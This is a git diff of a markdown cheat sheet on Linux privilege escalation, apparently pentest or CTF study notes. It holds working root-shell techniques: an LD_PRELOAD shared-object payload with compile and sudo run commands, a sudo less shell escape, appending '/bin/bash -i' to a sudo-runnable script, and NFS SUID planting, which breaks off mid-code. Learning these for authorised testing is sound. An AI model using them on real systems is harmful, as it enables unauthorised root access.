@@ -9,7 +9,7 @@
 
 
 
-List of Automated Eumeration Tools 👇🏻
+## List of Automated Eumeration Tools 👇🏻
 
   - LinPeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
   - LinEnum - https://github.com/rebootuser/LinEnum
@@ -19,20 +19,33 @@ List of Automated Eumeration Tools 👇🏻
 
 ---
 
-***GTFOBins*** - https://gtfobins.github.io/ ⭐
+***⭐GTFOBins*** - https://gtfobins.github.io/ 
+
+---
+## Kernel Exploits
+  - sometimes the Kernel may be vulnerable
+  - To Check the version 
+```
+uname -a
+cat /etc/issue
+cat /proc/version
+```
+  - Now we have the information we can search for the vulnerabilities in Google or [exploit-db](www.exploit-db.com)
+  - We can also use [Linux Priv Checker]( https://github.com/linted/linuxprivchecker ) as mentioned above.
 
 ---
 
-***To list all the Binaries which have SUID and SGID bits set***
+
+## To list all the Binaries which have SUID and SGID bits set
 ```
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
-> after listing all the binaries check the exploits in [GTFOBins](https://gtfobins.github.io/) 
+  - after listing all the binaries check the exploits in [GTFOBins](https://gtfobins.github.io/) 
 
 ---
 
-***Using LD_Preload***
-> This piece of code will spawn root shell ➡️ [shell.c](https://github.com/Somchandra17/Privilege-Escalation/blob/01f889492ff51414fa077a01fa538ecd5a0d4543/shell.c)
+## Using LD_Preload
+  - This piece of code will spawn root shell ➡️ [shell.c](https://github.com/Somchandra17/Privilege-Escalation/blob/01f889492ff51414fa077a01fa538ecd5a0d4543/shell.c)
 ```
 #include <stdio.h>
 #include <sys/types.h>
@@ -45,47 +58,44 @@ setuid(0);
 system("/bin/bash");
 }
 ```
-> Compile it using GCC into a Shared Object file(.so)
+  - Compile it using GCC into a Shared Object file(.so)
 ```
 gcc -fPIC -shared -o shell.so shell.c -nostartfile
 ```
-> Run it by using LD_Preload option  
+  - Run it by using LD_Preload option  
 ```
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
 
 ---
 
-***Exploting Sudo Rights***
-> To list the executable Binaries/files 👉🏿 `sudo -l`
+## Exploting Sudo Rights
+  - To list the executable Binaries/files 👉🏿 `sudo -l`
 
 ![sudo -l](https://user-images.githubusercontent.com/85082756/149580032-d68641ca-96e2-4538-8032-7149d6c71111.png)
 
-> Now when we have the list of programs then we can search the following command in the [GFTObins](https://gtfobins.github.io/#+sudo)
-  - for above we can use the less binary for gaing root access with the following command 👇
-  - ```
-    sudo less /etc/profile
-    !/bin/sh
-    ```
-> If you got any file like **exec.sh** then we can edit the contents inside it and we can execute it
+  - Now when we have the list of programs then we can search the following command in the [GFTObins](https://gtfobins.github.io/#+sudo)
+    - for above we can use the less binary for gaing root access with the following command 👇
+    - ```
+      sudo less /etc/profile
+      !/bin/sh
+      ```
+  - If you got any file like **exec.sh** then we can edit the contents inside it and we can execute it
 ```
 echo "/bin/bash -i" >> exec.sh
 ```
 ```
 sudo ./exec.sh
 ```
-> Check the following articles 👇
+  > Check the following articles 👇
 
  - https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
  - https://steflan-security.com/linux-privilege-escalation-vulnerable-sudo-version/
-
+ - **Abusing 'find', 'vim' and 'awk' for root access** - https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/
 ---
 
-***Abusing 'find', 'vim' and 'awk' for root access*** - https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/
 
----
-
-***Through Capabilities***
+## Through Capabilities
   - List all enabled Capabilities
 ```
 getcap -r / 2>/dev/null
@@ -94,7 +104,7 @@ getcap -r / 2>/dev/null
 
 ---
 
-***Cron job configurations***
+## Cron job configurations
   - Anyone can read the file cron jobs under 👇🏻
 ```
 /etc/crontab
@@ -108,7 +118,7 @@ getcap -r / 2>/dev/null
   
 ---
 
-***Using $PATH***
+## Using $PATH
   - list the PATH by ``echo $PATH``
 
   - find for writable path ``find / -writable 2>/dev/null`` or clean the out put using -> `` find / -writable 2>/dev/null | cut -d "/" -f2 | sort -u ``
@@ -131,7 +141,7 @@ getcap -r / 2>/dev/null
 
 ---
 
-***Network File Share***
+## Network File Share
   - The list of all the fielsystems which may be exported is present in `/etc/exports`.
 
 
@@ -143,7 +153,7 @@ getcap -r / 2>/dev/null
   - Then just mount the shared to your attack machine by 👉🏻 `mount -o rw {ip of target}:{mountable dir} /{dir of ur attack machine}`
 
 
-  - Just create a executable with SUID bit set in that folder which can run /bin/bash on the target system check this * for example 
+  - Just create a executable with SUID bit set in that folder which can run /bin/bash on the target system check this [nfs.c](nfs.c) for example 
 ```
 int main()
 {setgid(0);
